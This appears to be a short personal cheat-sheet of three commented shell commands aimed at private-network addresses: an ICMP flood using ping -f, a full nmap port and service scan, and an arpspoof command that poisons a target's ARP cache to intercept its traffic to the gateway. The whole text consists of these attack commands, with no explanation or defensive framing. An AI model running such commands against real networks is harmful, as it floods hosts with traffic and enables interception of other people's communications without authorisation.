#ICMP flood
ping -f 192.168.1.131
#Scanning local network
nmap -p- -sV 192.168.140.52
#ARP Spoofing
arpspoof -i eth0 -t 192.168.1.131 192.168.1.1